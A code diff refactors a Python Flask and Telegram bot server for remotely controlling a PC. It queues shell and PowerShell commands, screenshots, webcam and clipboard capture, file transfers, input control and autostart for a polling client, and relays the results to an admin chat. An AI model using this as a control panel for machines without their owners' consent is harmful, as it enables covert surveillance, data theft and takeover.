@@ -1,5 +1,4 @@
 import telebot, os, time, datetime, threading
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from flask import Flask, request, abort, jsonify, send_file
 from werkzeug.utils import secure_filename
 
@@ -12,253 +11,225 @@ PORT = int(os.environ.get("PORT", "5000"))
 bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
 app = Flask(__name__)
 
-pending_commands = []
-pc_status = {"online": False, "last_seen": None, "count": 0}
-UPLOAD_DIR = "/tmp/uploads"
-os.makedirs(UPLOAD_DIR, exist_ok=True)
-cmd_id = 0
-user_state = {}  # chat_id -> {"waiting": "cmd"/"msg"/etc}
+pending = []
+pc = {"online": False, "last": None}
+UPLOAD = "/tmp/uploads"
+os.makedirs(UPLOAD, exist_ok=True)
+cid = 0
+state = {}
 
-# ---- PAGES (8 buttons + arrows) ----
-PAGES = [
-    [("📸 Скрин", "screen"), ("ℹ️ Инфо", "info"),
-     ("📋 Процессы", "procs"), ("📂 Файлы", "ls:"),
-     ("📋 Буфер", "clip"), ("💬 Сообщение", "ask_msg"),
-     ("⚡ CMD", "ask_cmd"), ("🔒 Блокировка", "lock")],
-
-    [("🖱 Клик мыши", "ask_click"), ("🖱 Двигать мышь", "ask_mouse"),
-     ("⌨️ Клавиша", "ask_key"), ("🔊 Громкость +", "volume:up"),
-     ("🔉 Громкость -", "volume:down"), ("🔇 Без звука", "volume:mute"),
-     ("🎤 Запись 5сек", "record:5"), ("🎥 Вебкамера", "webcam")],
-
-    [("🚀 Запустить", "ask_run"), ("📦 Переместить", "ask_move"),
-     ("🔍 Поиск папки", "ask_search"), ("📥 Скачать файл", "ask_dl"),
-     ("💀 Выключить", "shutdown"), ("🔄 Перезагрузка", "restart"),
-     ("🏠 Автозагрузка", "startup"), ("📊 Статус", "status")],
-
-    [("🔐 Шифровать", "ask_encrypt"), ("🔓 Расшифровать", "ask_decrypt"),
-     ("⚡ PowerShell", "ask_ps"), ("📝 Путь сменить", "ask_cd"),
-     ("🗑 Убить процесс", "ask_kill"), ("🖥 Скрин области", "screen"),
-     ("📤 Push-уведомл.", "ask_push"), ("🔙 В начало", "page:0")],
+# ---- Pages ----
+P = [
+    [["📸 Скрин", "ℹ️ Инфо"],["📋 Процессы", "📂 Файлы"],["📋 Буфер", "💬 MSG"],["⚡ CMD", "🔒 Блок"], ["➡️"]],
+    [["🖱 Клик", "🖱 Мышь"],["⌨️ Клавиша", "🔊 Громкость+"],["🔉 Громкость-", "🔇 Мут"],["🎥 Камера", "🚀 Запуск"],["⬅️", "➡️"]],
+    [["📦 Переместить", "🔍 Поиск"],["📥 Скачать", "📤 Push"],["💀 Выкл", "🔄 Рестарт"],["🏠 Авто", "📊 Статус"],["⬅️"]],
 ]
+page = {}
 
-def menu_kb(page=0):
-    kb = InlineKeyboardMarkup(row_width=2)
-    for i in range(0, len(PAGES[page]), 2):
-        row = PAGES[page][i:i+2]
-        kb.row(*[InlineKeyboardButton(t, callback_data=d) for t, d in row])
-    # Navigation
-    nav = []
-    if page > 0: nav.append(InlineKeyboardButton("⬅️ Назад", callback_data=f"page:{page-1}"))
-    nav.append(InlineKeyboardButton(f"{page+1}/{len(PAGES)}", callback_data="noop"))
-    if page < len(PAGES)-1: nav.append(InlineKeyboardButton("Вперёд ➡️", callback_data=f"page:{page+1}"))
-    kb.row(*nav)
-    return kb
+def kb(pg=0):
+    k = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
+    for row in P[pg]:
+        k.row(*row)
+    return k
 
-def status_text():
-    s = "🟢 Онлайн" if pc_status["online"] else "🔴 Оффлайн"
-    t = pc_status.get("last_seen", "—")
-    return f"🖥 <b>Управление ПК</b>\n\nСтатус: {s}\nПоследний раз: {t}"
+def q(cmd):
+    global cid; cid += 1
+    pending.append({"id": cid, "cmd": cmd})
 
-# ---- FLASK ----
+# ---- Flask ----
 @app.route('/')
-def index():
-    s = "Online" if pc_status["online"] else "Offline"
-    return f"<h2>PC Remote</h2><p>PC: {s}</p>", 200
+def index(): return "OK", 200
 
 @app.route(f'/{BOT_TOKEN}', methods=['POST'])
-def webhook():
+def wh():
     if request.content_type == 'application/json':
         bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
         return '', 200
     abort(403)
 
 @app.route('/api/poll')
-def api_poll():
+def poll():
     if request.args.get('key') != API_KEY: abort(403)
-    pc_status["online"] = True
-    pc_status["last_seen"] = datetime.datetime.now().strftime("%H:%M:%S")
-    cmds = list(pending_commands); pending_commands.clear()
-    return jsonify({"commands": cmds})
+    pc["online"] = True
+    pc["last"] = datetime.datetime.now().strftime("%H:%M:%S")
+    c = list(pending); pending.clear()
+    return jsonify({"commands": c})
 
 @app.route('/api/result', methods=['POST'])
-def api_result():
+def result():
     k = request.form.get('key') or (request.json or {}).get('key')
     if k != API_KEY: abort(403)
     try:
-        if request.content_type and 'json' in request.content_type:
-            bot.send_message(ADMIN_ID, (request.json or {}).get('text', ''))
-        else:
-            t = request.form.get('text', '')
-            if t:
-                if len(t) > 4000: t = t[:4000] + "\n..."
-                bot.send_message(ADMIN_ID, t)
-    except Exception as e: print(f"Err: {e}")
+        t = request.form.get('text', '') if request.form else (request.json or {}).get('text', '')
+        if t:
+            if len(t) > 4000: t = t[:4000] + "\n..."
+            bot.send_message(ADMIN_ID, t)
+    except Exception as e: print(e)
     return "ok"
 
 @app.route('/api/photo', methods=['POST'])
-def api_photo():
+def photo():
     if request.form.get('key') != API_KEY: abort(403)
     try:
         f = request.files.get('photo')
         if f:
-            p = os.path.join(UPLOAD_DIR, "s.jpg"); f.save(p)
+            p = os.path.join(UPLOAD, "s.jpg"); f.save(p)
             with open(p, 'rb') as x: bot.send_photo(ADMIN_ID, x)
             os.remove(p)
-    except Exception as e: print(f"Err: {e}")
+    except Exception as e: print(e)
     return "ok"
 
 @app.route('/api/file', methods=['POST'])
-def api_file():
+def file():
     if request.form.get('key') != API_KEY: abort(403)
     try:
         f = request.files.get('file')
         fn = request.form.get('filename', 'file')
         if f:
-            p = os.path.join(UPLOAD_DIR, secure_filename(fn)); f.save(p)
+            p = os.path.join(UPLOAD, secure_filename(fn)); f.save(p)
             with open(p, 'rb') as x: bot.send_document(ADMIN_ID, x, visible_file_name=fn)
             os.remove(p)
-    except Exception as e: print(f"Err: {e}")
-    return "ok"
-
-@app.route('/api/audio', methods=['POST'])
-def api_audio():
-    if request.form.get('key') != API_KEY: abort(403)
-    try:
-        f = request.files.get('audio')
-        if f:
-            p = os.path.join(UPLOAD_DIR, "rec.wav"); f.save(p)
-            with open(p, 'rb') as x: bot.send_audio(ADMIN_ID, x, title="Recording")
-            os.remove(p)
-    except Exception as e: print(f"Err: {e}")
+    except Exception as e: print(e)
     return "ok"
 
 @app.route('/api/download')
-def api_download():
+def dl():
     if request.args.get('key') != API_KEY: abort(403)
-    for fn in os.listdir(UPLOAD_DIR):
+    for fn in os.listdir(UPLOAD):
         if fn.startswith("for_pc_"):
-            return send_file(os.path.join(UPLOAD_DIR, fn), download_name=fn[7:], as_attachment=True)
+            return send_file(os.path.join(UPLOAD, fn), download_name=fn[7:], as_attachment=True)
     return jsonify({"file": None})
 
-# ---- Queue ----
-def q(cmd):
-    global cmd_id; cmd_id += 1
-    pending_commands.append({"id": cmd_id, "cmd": cmd})
-
-# ---- CALLBACK HANDLER ----
-@bot.callback_query_handler(func=lambda c: True)
-def cb(call):
-    if call.message.chat.id != ADMIN_ID: return
-    d = call.data
-    bot.answer_callback_query(call.id)
-
-    if d.startswith("page:"):
-        p = int(d[5:])
-        bot.edit_message_text(status_text(), call.message.chat.id, call.message.message_id,
-                              parse_mode='HTML', reply_markup=menu_kb(p))
-    elif d == "noop": return
-    elif d == "screen": q("screen"); bot.send_message(ADMIN_ID, "📸 Скрин...")
-    elif d == "info": q("info")
-    elif d == "procs": q("procs")
-    elif d.startswith("ls:"): q(f"ls:{d[3:]}"); bot.send_message(ADMIN_ID, "📂 Загрузка...")
-    elif d == "clip": q("clip")
-    elif d == "lock": q("lock"); bot.send_message(ADMIN_ID, "🔒")
-    elif d == "webcam": q("webcam"); bot.send_message(ADMIN_ID, "🎥 Камера...")
-    elif d.startswith("volume:"): q(d)
-    elif d.startswith("record:"): q(d); bot.send_message(ADMIN_ID, "🎤 Запись...")
-    elif d == "shutdown": q("shutdown"); bot.send_message(ADMIN_ID, "💀")
-    elif d == "restart": q("restart"); bot.send_message(ADMIN_ID, "🔄")
-    elif d == "startup": q("startup")
-    elif d == "status":
-        s = "🟢" if pc_status["online"] else "🔴"
-        bot.send_message(ADMIN_ID, f"{s} Статус: {'Онлайн' if pc_status['online'] else 'Оффлайн'}\n⏰ {pc_status.get('last_seen','—')}")
-    # Ask for input
-    elif d.startswith("ask_"):
-        prompts = {
-            "ask_cmd": "Введи CMD команду:", "ask_ps": "Введи PowerShell команду:",
-            "ask_msg": "Введи текст сообщения:", "ask_click": "Введи координаты: x,y",
-            "ask_mouse": "Введи координаты: x,y", "ask_key": "Введи клавишу (напр: enter, space, a, f5):",
-            "ask_run": "Введи путь к файлу:", "ask_move": "Введи: откуда > куда",
-            "ask_search": "Введи имя папки:", "ask_dl": "Введи путь к файлу:",
-            "ask_cd": "Введи путь:", "ask_kill": "Введи PID:",
-            "ask_encrypt": "Введи текст для шифрования:", "ask_decrypt": "Введи текст для расшифровки:",
-            "ask_push": "Введи текст уведомления:",
-        }
-        bot.send_message(ADMIN_ID, prompts.get(d, "Введи данные:"))
-        user_state[ADMIN_ID] = {"waiting": d[4:]}  # Remove "ask_" prefix
-
-# ---- TEXT HANDLER ----
+# ---- Handlers ----
 @bot.message_handler(commands=['start', 'help', 'menu'])
-def cmd_start(msg):
+def start(msg):
     if msg.chat.id != ADMIN_ID: return
-    bot.send_message(msg.chat.id, status_text(), parse_mode='HTML', reply_markup=menu_kb(0))
+    page[msg.chat.id] = 0
+    s = "🟢" if pc["online"] else "🔴"
+    bot.send_message(msg.chat.id, f"{s} Управление ПК\n/cmd /ps /screen /info /ls /dl /kill", reply_markup=kb(0))
 
-@bot.message_handler(func=lambda m: m.chat.id == ADMIN_ID and m.text and m.text.startswith('/'))
-def cmd_slash(msg):
-    t = msg.text
-    if t.startswith("/cmd "): q(f"cmd:{t[5:]}"); bot.send_message(msg.chat.id, "⏳")
-    elif t.startswith("/ps "): q(f"ps:{t[4:]}"); bot.send_message(msg.chat.id, "⏳")
-    elif t == "/screen": q("screen")
-    elif t == "/info": q("info")
-    elif t == "/procs": q("procs")
-    elif t.startswith("/kill "): q(f"kill:{t[6:]}")
-    elif t.startswith("/ls"): q(f"ls:{t[4:].strip()}")
-    elif t.startswith("/cd "): q(f"cd:{t[4:]}")
-    elif t.startswith("/dl "): q(f"dl:{t[4:]}")
-    elif t == "/clip": q("clip")
-    elif t.startswith("/msg "): q(f"msg:{t[5:]}")
-    elif t == "/lock": q("lock")
-    elif t == "/shutdown": q("shutdown")
-    elif t == "/restart": q("restart")
-    elif t == "/menu": bot.send_message(msg.chat.id, status_text(), parse_mode='HTML', reply_markup=menu_kb(0))
-
-@bot.message_handler(func=lambda m: m.chat.id == ADMIN_ID, content_types=['text'])
-def handle_text(msg):
-    state = user_state.pop(ADMIN_ID, None)
-    if not state: return
-    w = state["waiting"]
-    t = msg.text
-    if w == "cmd": q(f"cmd:{t}"); bot.send_message(msg.chat.id, f"⚡ {t}")
-    elif w == "ps": q(f"ps:{t}"); bot.send_message(msg.chat.id, f"⚡ PS: {t}")
-    elif w == "msg": q(f"msg:{t}"); bot.send_message(msg.chat.id, "💬 Отправлено")
-    elif w == "click": q(f"click:{t}"); bot.send_message(msg.chat.id, f"🖱 Клик: {t}")
-    elif w == "mouse": q(f"mouse:{t}"); bot.send_message(msg.chat.id, f"🖱 Мышь: {t}")
-    elif w == "key": q(f"key:{t}"); bot.send_message(msg.chat.id, f"⌨️ Клавиша: {t}")
-    elif w == "run": q(f"run:{t}"); bot.send_message(msg.chat.id, f"🚀 Запуск: {t}")
-    elif w == "move": q(f"move:{t}"); bot.send_message(msg.chat.id, f"📦 Перемещение")
-    elif w == "search": q(f"search:{t}"); bot.send_message(msg.chat.id, f"🔍 Ищу: {t}")
-    elif w == "dl": q(f"dl:{t}"); bot.send_message(msg.chat.id, f"📥 Скачиваю")
-    elif w == "cd": q(f"cd:{t}")
-    elif w == "kill": q(f"kill:{t}")
-    elif w == "encrypt": q(f"encrypt:{t}"); bot.send_message(msg.chat.id, "🔐")
-    elif w == "decrypt": q(f"decrypt:{t}"); bot.send_message(msg.chat.id, "🔓")
-    elif w == "push": q(f"push:{t}"); bot.send_message(msg.chat.id, "📤 Push отправлен")
-
-@bot.message_handler(content_types=['document'])
-def handle_doc(msg):
+@bot.message_handler(commands=['cmd'])
+def h_cmd(msg):
     if msg.chat.id != ADMIN_ID: return
+    c = msg.text[5:].strip()
+    if c: q(f"cmd:{c}"); bot.send_message(msg.chat.id, f"⏳ {c}")
+    else: state[msg.chat.id] = "cmd"; bot.send_message(msg.chat.id, "Введи CMD команду:")
+
+@bot.message_handler(commands=['ps'])
+def h_ps(msg):
+    if msg.chat.id != ADMIN_ID: return
+    c = msg.text[4:].strip()
+    if c: q(f"ps:{c}")
+    else: state[msg.chat.id] = "ps"; bot.send_message(msg.chat.id, "Введи PS команду:")
+
+@bot.message_handler(commands=['screen'])
+def h_scr(msg):
+    if msg.chat.id != ADMIN_ID: return
+    q("screen")
+
+@bot.message_handler(commands=['info'])
+def h_info(msg):
+    if msg.chat.id != ADMIN_ID: return
+    q("info")
+
+@bot.message_handler(commands=['ls'])
+def h_ls(msg):
+    if msg.chat.id != ADMIN_ID: return
+    q(f"ls:{msg.text[4:].strip()}")
+
+@bot.message_handler(commands=['dl'])
+def h_dl(msg):
+    if msg.chat.id != ADMIN_ID: return
+    p = msg.text[4:].strip()
+    if p: q(f"dl:{p}")
+    else: state[msg.chat.id] = "dl"; bot.send_message(msg.chat.id, "Путь к файлу:")
+
+@bot.message_handler(commands=['kill'])
+def h_kill(msg):
+    if msg.chat.id != ADMIN_ID: return
+    p = msg.text[6:].strip()
+    if p: q(f"kill:{p}")
+
+@bot.message_handler(func=lambda m: m.chat.id == ADMIN_ID and m.content_type == 'document')
+def h_doc(msg):
     try:
         fi = bot.get_file(msg.document.file_id)
         data = bot.download_file(fi.file_path)
-        fname = "for_pc_" + (msg.document.file_name or "file")
-        with open(os.path.join(UPLOAD_DIR, fname), 'wb') as f: f.write(data)
+        fn = "for_pc_" + (msg.document.file_name or "file")
+        with open(os.path.join(UPLOAD, fn), 'wb') as f: f.write(data)
         q(f"upload:{msg.document.file_name or 'file'}")
-        bot.send_message(msg.chat.id, f"📤 → ПК: {msg.document.file_name}")
-    except Exception as e: bot.send_message(msg.chat.id, f"Err: {e}")
+        bot.send_message(msg.chat.id, f"📤 → ПК")
+    except Exception as e: bot.send_message(msg.chat.id, str(e))
+
+@bot.message_handler(func=lambda m: m.chat.id == ADMIN_ID, content_types=['text'])
+def h_text(msg):
+    t = msg.text
+    pg = page.get(msg.chat.id, 0)
+
+    # Navigation
+    if t == "➡️":
+        pg = min(pg + 1, len(P) - 1); page[msg.chat.id] = pg
+        bot.send_message(msg.chat.id, f"Стр. {pg+1}/{len(P)}", reply_markup=kb(pg)); return
+    if t == "⬅️":
+        pg = max(pg - 1, 0); page[msg.chat.id] = pg
+        bot.send_message(msg.chat.id, f"Стр. {pg+1}/{len(P)}", reply_markup=kb(pg)); return
+
+    # State input
+    s = state.pop(msg.chat.id, None)
+    if s:
+        if s == "cmd": q(f"cmd:{t}")
+        elif s == "ps": q(f"ps:{t}")
+        elif s == "msg": q(f"msg:{t}")
+        elif s == "click": q(f"click:{t}")
+        elif s == "mouse": q(f"mouse:{t}")
+        elif s == "key": q(f"key:{t}")
+        elif s == "run": q(f"run:{t}")
+        elif s == "move": q(f"move:{t}")
+        elif s == "search": q(f"search:{t}")
+        elif s == "dl": q(f"dl:{t}")
+        elif s == "push": q(f"push:{t}")
+        bot.send_message(msg.chat.id, "⏳"); return
+
+    # Buttons
+    if "Скрин" in t: q("screen"); bot.send_message(msg.chat.id, "📸")
+    elif "Инфо" in t: q("info")
+    elif "Процессы" in t: q("procs")
+    elif "Файлы" in t: q("ls:")
+    elif "Буфер" in t: q("clip")
+    elif "MSG" in t: state[msg.chat.id] = "msg"; bot.send_message(msg.chat.id, "Текст:")
+    elif "CMD" in t: state[msg.chat.id] = "cmd"; bot.send_message(msg.chat.id, "CMD:")
+    elif "Блок" in t: q("lock"); bot.send_message(msg.chat.id, "🔒")
+    elif "Клик" in t: state[msg.chat.id] = "click"; bot.send_message(msg.chat.id, "x,y:")
+    elif "Мышь" in t: state[msg.chat.id] = "mouse"; bot.send_message(msg.chat.id, "x,y:")
+    elif "Клавиша" in t: state[msg.chat.id] = "key"; bot.send_message(msg.chat.id, "Клавиша (enter/space/a):")
+    elif "Громкость+" in t: q("volume:up")
+    elif "Громкость-" in t: q("volume:down")
+    elif "Мут" in t: q("volume:mute")
+    elif "Камера" in t: q("webcam"); bot.send_message(msg.chat.id, "🎥")
+    elif "Запуск" in t: state[msg.chat.id] = "run"; bot.send_message(msg.chat.id, "Путь:")
+    elif "Переместить" in t: state[msg.chat.id] = "move"; bot.send_message(msg.chat.id, "откуда > куда:")
+    elif "Поиск" in t: state[msg.chat.id] = "search"; bot.send_message(msg.chat.id, "Имя папки:")
+    elif "Скачать" in t: state[msg.chat.id] = "dl"; bot.send_message(msg.chat.id, "Путь:")
+    elif "Push" in t: state[msg.chat.id] = "push"; bot.send_message(msg.chat.id, "Текст:")
+    elif "Выкл" in t: q("shutdown"); bot.send_message(msg.chat.id, "💀")
+    elif "Рестарт" in t: q("restart"); bot.send_message(msg.chat.id, "🔄")
+    elif "Авто" in t: q("startup")
+    elif "Статус" in t:
+        s = "🟢 Онлайн" if pc["online"] else "🔴 Оффлайн"
+        bot.send_message(msg.chat.id, f"{s}\n⏰ {pc.get('last','—')}")
 
 # ---- Timeout ----
-def timeout_check():
+def timeout():
     while True:
         time.sleep(15)
-        if pc_status["online"] and pc_status["last_seen"]:
+        if pc["online"] and pc["last"]:
             try:
-                last = datetime.datetime.strptime(pc_status["last_seen"], "%H:%M:%S")
-                now = datetime.datetime.now()
+                last = datetime.datetime.strptime(pc["last"], "%H:%M:%S")
+                now = datetime.datetime.now().replace(microsecond=0)
                 last = last.replace(year=now.year, month=now.month, day=now.day)
-                if (now - last).total_seconds() > 20: pc_status["online"] = False
+                if (now - last).total_seconds() > 20: pc["online"] = False
             except: pass
-threading.Thread(target=timeout_check, daemon=True).start()
+threading.Thread(target=timeout, daemon=True).start()
 
 # ---- Start ----
 if RENDER_URL:
